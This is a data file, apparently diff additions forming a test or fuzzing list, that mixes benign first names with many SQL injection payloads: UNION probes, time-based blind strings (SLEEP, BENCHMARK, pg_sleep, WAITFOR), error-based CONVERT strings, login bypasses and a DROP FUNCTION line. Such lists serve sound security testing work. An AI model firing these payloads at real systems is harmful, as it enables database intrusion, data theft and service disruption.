+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'"
+'AND 0'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'''
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8'"
+'Alice'
+'John'
+'Charlie'
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--'"
+'#	    Hash comment'
+'Fran'
+'' or sleep(5)=''
+'David'
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Eve'
+'Hank'
+'Jill'
+'Fran'
+''));
+'Eve'
+'' AND id IS NULL; --'
+'Alice'
+'Charlie'
+'Hank'
+'Charlie'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--'"
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8--'"
+'John'
+'Eve'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'"
+'Jill'
+'Grace'
+'Bob'
+'Bob'
+'Charlie'
+'Alice'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'"
+'SLEEP(5)=''
+'Alice'
+'Hank'
+'ORDER BY 31337--'
+'# from wapiti'
+'Jill'
+'pg_sleep(5)--'
+'David'
+'pg_SLEEP(5)'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'"
+'David'
+'Charlie'
+'David'
+'Hank'
+'Bob'
+'Eve'
+'Fran'
+'John'
+"'ORDER BY 1,SLEEP(5)'"
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),3'"
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'"
+"'UNION ALL SELECT 1,2,3,4,5,6--'"
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+'Grace'
+'John'
+'David'
+'AND 7300=7300 AND ('pKlZ'='pKlZ'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'"
+''^''
+'Jill'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10'"
+'Charlie'
+'ORDER BY 6#'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'"
+'Jill'
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+'Eve'
+'Fran'
+'Grace'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'"
+'Alice'
+'David'
+'Fran'
+'' or sleep(5)=''
+'Eve'
+'Fran'
+'Grace'
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'"
+'Fran'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'John'
+'AND 7300=7300 AND 'pKlZ'='pKlZ'
+'Fran'
+'ORDER BY 7'
+'' ''
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'UNION ALL SELECT 1'
+'WHERE 1=1 AND 1=0#'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'"
+'AND 1=1'
+"'1 or benchmark(10000000,MD5(1))#'"
+'Bob'
+'ORDER BY 9#'
+'Alice'
+'David'
+'Charlie'
+'Fran'
+'John'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Hank'
+'`'
+'Hank'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'John'
+'Bob'
+'John'
+'admin') or ('1'='1'--'
+'Fran'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'WHERE 1=1 AND 1=1--'
+'Grace'
+'Charlie'
+'Fran'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'"
+'Fran'
+'David'
+'ORDER BY 5#'
+"'"""") or true--'"
+"'"""") or (""""x"""")=(""""x'"
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'"
+'Grace'
+'Eve'
+'1 or sleep(5)#'
+'Charlie'
+'Eve'
+'Fran'
+'Hank'
+'Alice'
+'Fran'
+'Fran'
+'David'
+'Grace'
+'John'
+'Fran'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'"
+'') or ('x')=('x'
+'Alice'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'benchmark(50000000,MD5(1))#'"
+'Hank'
+'Eve'
+'Jill'
+'Alice'
+'Alice'
+'OR 1=1--'
+'Grace'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'Grace'
+"'UNION ALL SELECT 1,2,3'"
+'Charlie'
+'UNION ALL SELECT 1'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'"
+'Charlie'
+'David'
+'Charlie'
+'Grace'
+'David'
+'Grace'
+'@@variable	global variable'
+'Eve'
+'David'
+'Eve'
+'Hank'
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'"
+'Charlie'
+'Eve'
+"'UNION ALL SELECT 1,2#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15'"
+'Grace'
+'David'
+'David'
+'Grace'
+'Grace'
+'/*  	C-style comment'
+'David'
+'John'
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'"
+'Jill'
+'AND 1=1'
+'Bob'
+'John'
+'Eve'
+'Grace'
+'Grace'
+'Bob'
+'Fran'
+'Fran'
+'Eve'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'"
+'Jill'
+'Eve'
+'Alice'
+'David'
+'Grace'
+'Alice'
+'Charlie'
+'Eve'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'"
+'Eve'
+'Eve'
+'Jill'
+'John'
+'John'
+''^''
+'OR 1=0'
+'Hank'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Grace'
+'Fran'
+'Grace'
+'Alice'
+'Charlie'
+'David'
+'# Numeric'
+'Bob'
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'"
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+'ORDER BY SLEEP(5)'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'ORDER BY 4--'
+"'"""") or benchmark(10000000,MD5(1))#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'' UNION SELECT sum(columnname ) from tablename --'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'AND 1083=1083 AND (1427=1427'
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+'Charlie'
+'Jill'
+'Hank'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'
+'Grace'
+'Alice'
+'Grace'
+'1 or sleep(5)#'
+'Eve'
+'1' ORDER BY 1--+'
+'David'
+'David'
+'ORDER BY 9--'
+'Alice'
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'"
+'Bob'
+'Grace'
+'Hank'
+'Hank'
+'Eve'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'Eve'
+'Hank'
+Microservice running on port 4300
+'SLEEP(5)=''
+'John'
+'Bob'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'"
+'' AND id IS NULL; --'
+'Bob'
+'' or '' ''
+'Bob'
+"'admin"""" or """"1""""=""""1""""--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'"
+'OR x=x'
+'David'
+'Alice'
+'ORDER BY 10--'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+'1)) or pg_sleep(5)--'
+'Bob'
+'John'
+'Bob'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6#'"
+'Grace'
+'Hank'
+'David'
+'Charlie'
+'Fran'
+'Eve'
+'Bob'
+'Grace'
+'Jill'
+'Hank'
+"'""""*""""'"
+'Hank'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'"
+'Charlie'
+'Charlie'
+'Fran'
+'Alice'
+'Hank'
+'Charlie'
+'Grace'
+'John'
+"'"""" or """"""""^""""'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--'"
+'or SLEEP(5)#'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'"
+'John'
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'"
+'Fran'
+"'and (select substring(@@version,1,1))='M''"
+'John'
+'Fran'
+'Grace'
+'ORDER BY 14--'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6#'"
+'Jill'
+'OR x=y#'
+'Alice'
+'David'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'"
+"'' AND MID(VERSION(),1,1) = '5';'"
+"',(select * from (select(sleep(10)))a)'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Eve'
+'ORDER BY 13'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'"
+'John'
+'Jill'
+'ORDER BY 16'
+"'""""*""""'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'Grace'
+'Alice'
+'HAVING 1=1#'
+'David'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'"
+'&&SLEEP(5)--'
+'Fran'
+'Jill'
+'Charlie'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'"
+'Eve'
+'Fran'
+'Hank'
+'Charlie'
+'1' ORDER BY 3--+'
+'admin'/*'
+'Hank'
+'Jill'
+'John'
+'Fran'
+'Hank'
+'');
+'Eve'
+'Hank'
+'AS INJECTX WHERE 1=1 AND 1=0'
+'David'
+"'and (select substring(@@version,1,1))='M''"
+'AND 1=0 AND '%'=''
+'Grace'
+'ORDER BY 9'
+'Bob'
+'WHERE 1=1 AND 1=0#'
+'Charlie'
+'Bob'
+'Eve'
+"'1' ORDER BY 1,2,3--+'"
+'Eve'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'"
+'Grace'
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'"
+'Hank'
+'sleep(5)#'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+"'UNION ALL SELECT 1,2,3,4'"
+'Grace'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#'"
+'Alice'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'Charlie'
+"'1' ORDER BY 1,2,3--+'"
+"'or SLEEP(5)=""""'"
+'' or ''&''
+"''\""""'"
+'Hank'
+'Alice'
+'David'
+'Grace'
+'David'
+'Hank'
+'or 1=1/*'
+'Bob'
+'Grace'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+'Bob'
+'') or pg_sleep(5)--'
+'Grace'
+'Grace'
+"'1' ORDER BY 1,2--+'"
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'"
+"'1' ORDER BY 1,2--+'"
+'Bob'
+'Fran'
+'OR 1=1--'
+'Alice'
+'John'
+'Hank'
+"''\""""'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+'ORDER BY SLEEP(5)'
+'Alice'
+'Charlie'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+'Alice'
+'Hank'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'"
+'Jill'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'David'
+'Bob'
+'Hank'
+'Charlie'
+'Grace'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'David'
+"'and (select substring(@@version,1,1))='X''"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'"
+"'UNION ALL SELECT 1,2,3,4,5,6#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'"
+'John'
+'-- -	SQL comment'
+'Charlie'
+'Fran'
+';
+'ORDER BY 25'
+'Hank'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'"
+'Jill'
+'Fran'
+"'and (select substring(@@version,1,1))='X''"
+'# from wapiti'
+'David'
+'John'
+'David'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Hank'
+"'""""-""""'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'Bob'
+'John'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'"
+'HAVING 1=0--'
+'or pg_SLEEP(5)--'
+'ORDER BY 1'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+'Bob'
+'John'
+'Hank'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'"
+'Fran'
+'ORDER BY 28#'
+'Fran'
+'John'
+'Bob'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#'"
+'Eve'
+'David'
+'Eve'
+'Alice'
+'ORDER BY 8#'
+'AND 1=1'
+'Alice'
+'Bob'
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+'ORDER BY 7#'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'"
+'David'
+'' OR 'x'='x'
+'John'
+'John'
+'Hank'
+'ORDER BY 22#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'"
+'OR 1=0'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Hank'
+'Charlie'
+"'"""" OR 1 = 1 -- -'"
+'OR 1=1--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'or SLEEP(5)#'
+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'"
+'') or ('x')=('x'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'"
+'Jill'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+'';WAITFOR DELAY '0:0:30'--'
+"'' or """"'"
+"'UNION ALL SELECT 1,2,3,4,5#'"
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'"
+'Eve'
+'Grace'
+"'admin""""or 1=1 or """"""""=""""'"
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+'Eve'
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'"
+'Grace'
+'John'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+'Bob'
+'David'
+'Hank'
+'Eve'
+'David'
+"',(select * from (select(sleep(10)))a)'"
+'ORDER BY 1'
+'David'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'Jill'
+'Fran'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'"
+'Charlie'
+'Charlie'
+'John'
+'Eve'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#'"
+'Grace'
+'Charlie'
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'"
+'Grace'
+'Jill'
+'Alice'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'"
+'Jill'
+'Charlie'
+'Bob'
+'David'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7'"
+'Alice'
+'Alice'
+'1 or sleep(5)#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'"
+"'or benchmark(50000000,MD5(1))#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'ORDER BY 13#'
+'Charlie'
+'Bob'
+'Hank'
+"'"""" or """"""""*""""'"
+'John'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'"
+'Eve'
+"'ORDER BY 1,SLEEP(5)#'"
+'Jill'
+'Alice'
+'Jill'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+'AND 1=1#'
+'Jill'
+'Bob'
+'ORDER BY 5#'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'# Numeric'
+'Alice'
+'John'
+'Bob'
+'ORDER BY 18#'
+'Charlie'
+''''
+'ORDER BY 30#'
+"'admin"""") or """"1""""=""""1""""/*'"
+'Charlie'
+'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --'
+'John'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'WHERE 1=1 AND 1=0'
+'Fran'
+'John'
+'Fran'
+'Hank'
+'Fran'
+'Jill'
+"'""""*""""'"
+'Bob'
+'Bob'
+'John'
+'Charlie'
+'John'
+'John'
+'John'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))'"
+'Grace'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+'Fran'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))'"
+'Alice'
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+'Fran'
+'Hank'
+'Eve'
+'Hank'
+'Hank'
+'ORDER BY 7#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'"
+'OR x=x--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'"
+'Fran'
+'Jill'
